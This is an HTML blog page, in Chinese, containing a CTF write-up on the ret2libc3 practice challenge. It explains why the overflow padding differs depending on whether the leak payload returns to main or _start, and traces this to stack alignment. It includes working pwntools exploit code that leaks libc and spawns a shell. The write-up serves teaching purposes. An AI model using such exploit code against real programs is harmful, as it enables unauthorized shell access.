@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Shaw</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+    <meta name="baidu-site-verification" content="63656ec0c686f8aaeeaad1b7243ba233" />
+  
+  
+  <meta name="description" content="Ret2libc中的main与_start函数1. 题目背景Ret2libc3练习(ret2libc3-CTF Wiki)是一个简单的return to libc练习题，其通过向程序输入两次payload来get shell，第一次payload用于获取__libc_start_main函数真实加载地址，第二次payload通过该加载地址计算出libc中的偏移，进而调用system函数：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shaw">
+<meta property="og:url" content="http://example.com/2024/04/16/%E3%80%90%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF%E3%80%91Ret2libc%E4%B8%AD%E7%9A%84main%E4%B8%8E_start%E5%87%BD%E6%95%B0/index.html">
+<meta property="og:site_name" content="Shaw">
+<meta property="og:description" content="Ret2libc中的main与_start函数1. 题目背景Ret2libc3练习(ret2libc3-CTF Wiki)是一个简单的return to libc练习题，其通过向程序输入两次payload来get shell，第一次payload用于获取__libc_start_main函数真实加载地址，第二次payload通过该加载地址计算出libc中的偏移，进而调用system函数：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/.com//image-20240416143243963.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416144221180.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416144436368.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416182706318.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416182856052.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416183119295.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416184120512.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416185626897.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416190945992.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416191538952.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416193303822.png">
+<meta property="og:image" content="http://example.com/.com//image-20240416192551479.png">
+<meta property="article:published_time" content="2024-04-16T06:23:16.388Z">
+<meta property="article:modified_time" content="2024-04-16T11:40:49.533Z">
+<meta property="article:author" content="Shaw">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//image-20240416143243963.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Shaw" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/ytre.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" rel="home" >
+                <img style="margin-bottom: 10px;"  width="124px" height="124px" alt="Hike News" src=" /css/images/ytre.jpg">
+              </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">积沙成塔</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663" linktext="/"> <a class="" href="/">首页</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663" linktext="archives"> <a class="" href="/archives">归档</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663" linktext="categories"> <a class="" href="/categories">分类</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663" linktext="tags"> <a class="" href="/tags">标签</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663" linktext="about"> <a class="" href="/about">关于</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-【技术积累】Ret2libc中的main与_start函数" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+    <div class="article-meta">
+      
+	<a href="/2024/04/16/%E3%80%90%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF%E3%80%91Ret2libc%E4%B8%AD%E7%9A%84main%E4%B8%8E_start%E5%87%BD%E6%95%B0/" class="article-date">
+	  <time datetime="2024-04-16T06:23:16.388Z" itemprop="datePublished">四月 16, 2024</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Ret2libc中的main与-start函数"><a href="#Ret2libc中的main与-start函数" class="headerlink" title="Ret2libc中的main与_start函数"></a>Ret2libc中的main与_start函数</h1><h3 id="1-题目背景"><a href="#1-题目背景" class="headerlink" title="1. 题目背景"></a>1. 题目背景</h3><p>Ret2libc3练习(<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3-CTF Wiki</a>)是一个简单的return to libc练习题，其通过向程序输入两次payload来get shell，第一次payload用于获取<code>__libc_start_main</code>函数真实加载地址，第二次payload通过该加载地址计算出libc中的偏移，进而调用<code>system</code>函数：</p>
+<span id="more"></span>
+<p><img src="/.com//image-20240416143243963.png" style="zoom: 80%;"></p>
+<p>第一个payload:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+
+puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment"># 0x08048460</span>
+libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span> <span class="token comment"># 0x0804a024</span>
+main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> <span class="token comment"># 0x08048618</span>
+
+payload1 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+base_addr <span class="token operator">=</span> libc_start_main_addr<span class="token operator">-</span>libc_start_main_offset
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[INFO]libc_start_main_addr:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[INFO]base_addr = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>第二个payload(与第一个payload在同一个文件):</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> system_offset
+str_bin_sh_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> str_bin_sh_offset
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get shell"</span><span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>str_bin_sh_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>这里发现，如果payload1选择返回main函数，则payload2就是<code>b&#39;A&#39; * 104</code>，如果选择<code>_start</code>函数返回，则payload2就是<code>b&#39;A&#39; * 112</code>。</p>
+</blockquote>
+<h3 id="2-问题解析"><a href="#2-问题解析" class="headerlink" title="2. 问题解析"></a>2. 问题解析</h3><p>网上的资料解析如下：</p>
+<p><img src="/.com//image-20240416144221180.png" style="zoom:80%;"></p>
+<p>问题是，这个操作main函数里也有：</p>
+<p><img src="/.com//image-20240416144436368.png" style="zoom:80%;"></p>
+<p>并且该解释也没有说明payload2具体填充时到底是怎么错位了8 bit的。</p>
+<p>我们注意到_start函数和main函数都有如下语句<code>and esp, 0FFFFFFF0h</code>：</p>
+<p><img src="/.com//image-20240416182706318.png" style="zoom:80%;"></p>
+<p><img src="/.com//image-20240416182856052.png" style="zoom:80%;"></p>
+<p>但由于从_start到main涉及到了新函数栈的调用以及<code>__libc_start_main</code>调用，_start函数中对esp第八位置零作用不大（可能）。</p>
+<p><img src="/.com//image-20240416183119295.png" style="zoom:67%;"></p>
+<p>注意main函数开头的三句指令：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push    ebp
+mov     ebp, esp
+and 	esp, 0FFFFFFF0h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>这里令ebp=esp，并将esp的低八位置零，可能存在三种情况：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>ESP低八位</th>
+<th>三句指令后</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>esp == ebp</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ebp == esp + 4</td>
+</tr>
+<tr>
+<td>8</td>
+<td>ebp == esp + 8</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>这里分情况讨论再次进入main函数时的场景，注意再次进入main函数后，栈帧重新生成，数组S重新分配：</p>
+<ol>
+<li><p>ESP低8位为8：</p>
+<p><img src="/.com//image-20240416184120512.png" style="zoom:80%;"></p>
+<p>当运行至③时栈的结构如下：</p>
+<p><img src="/.com//image-20240416185626897.png" style="zoom: 67%;"></p>
+<p>可以看见由于esp比ebp开始就少了8字节，最后数组s的首地址距离返回地址108+4=112字节，payload2需要填充112字节。</p>
+<p>调试验证：</p>
+<p><img src="/.com//image-20240416190945992.png" alt></p>
+<p>从如果payload1从_start函数返回，则再次进入main函数时esp的后八位就为8，所以payload2需要填充112字节。</p>
+<ol>
+<li><p>ESP低8位为0：</p>
+<p>同理，如果第八位为0则payload2就填充128-28+4=104字节。如果payload1从man函数返回时，就是这种情况：</p>
+<p><img src="/.com//image-20240416191538952.png" alt></p>
+</li>
+<li><p>ESP低8位为4：</p>
+<p>如果ESP低8位为4（虽然此题没有这种情况），可以预见payload2需要填充128+4-28+4=108字节，使用IDA调试更改这个值来验证：</p>
+<p><img src="/.com//image-20240416193303822.png" alt></p>
+<p><img src="/.com//image-20240416192551479.png" style="zoom: 67%;"></p>
+</li>
+</ol>
+</li>
+</ol>
+<p>综上可以发现，造成不同payload长度的原因就是因为main函数开头构造栈帧时有一句特殊的<code>and esp, 0FFFFFFF0h</code>，从而导致不同的esp初始值需要不同的填充长度。</p>
+<h3 id="3-资料"><a href="#3-资料" class="headerlink" title="3. 资料"></a>3. 资料</h3><ul>
+<li><p>题目：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3-CTF Wiki</a></p>
+</li>
+<li><p>完整exp：</p>
+</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+
+ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
+
+puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+libc_start_main_offset <span class="token operator">=</span> <span class="token number">0x01ade0</span>
+
+<span class="token comment">#print hex(puts_plt), hex(libc_start_main_got), hex(main)</span>
+<span class="token comment">#print "leak libc_start_main_got addr and return to main again"</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span> puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Can you find it !?'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+<span class="token comment">#print "get the related addr"</span>
+libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_start_main_addr = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>libc
+libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_start_main_addr = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_start_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#print("libc.symbols['__libc_start_main'] = ",hex(libc.symbols['__libc_start_main']))</span>
+system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_offset = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token operator">-</span>libc_start_main_addr<span class="token operator">+</span>libc_start_main_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
+base_addr <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc_start_main_offset
+a  <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    binsh_addr <span class="token operator">=</span> i
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_offset = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>binsh_addr<span class="token operator">-</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#print "get shell"</span>
+<span class="token comment">#sh.recvuntil(b'Can you find it !?')</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">104</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>References:<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3-CSDN博客</a></li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/04/04/%E3%80%90%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF%E3%80%91Fuzzm%20Stack&Heap%20Instrumentation%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">(技术积累)Fuzzm Heap&amp;Stack Instrumentation代码解析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ret2libc%E4%B8%AD%E7%9A%84main%E4%B8%8E-start%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">Ret2libc中的main与_start函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%A2%98%E7%9B%AE%E8%83%8C%E6%99%AF"><span class="nav-number">1.0.1.</span> <span class="nav-text">1. 题目背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%97%AE%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="nav-number">1.0.2.</span> <span class="nav-text">2. 问题解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%B5%84%E6%96%99"><span class="nav-number">1.0.3.</span> <span class="nav-text">3. 资料</span></a></li></ol></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+<footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2024 Shaw All Rights Reserved.
+        
+          <span id="busuanzi_container_site_pv">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+            本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+
+  
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/bootstrap.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'true', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<!-- Gaug.es Analytics -->
+<script type="text/javascript">
+  var _gauges = _gauges || [];
+  (function() {
+    var t   = document.createElement('script');
+    t.type  = 'text/javascript';
+    t.async = true;
+    t.id    = 'gauges-tracker';
+    t.setAttribute('data-site-id', 'true');
+    t.setAttribute('data-track-path', 'https://track.gaug.es/track.gif');
+    t.src = 'https://d36ee2fcip1434.cloudfront.net/track.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(t, s);
+  })();
+</script>
+<!-- End Gaug.es Analytics -->
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+	<script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2439014eb270056ee1808a49956fe114";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+<!-- Tencent Analytics -->
+	<script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId={{ theme.tencent_analytics }}";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+<!-- End Tencent Analytics -->
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
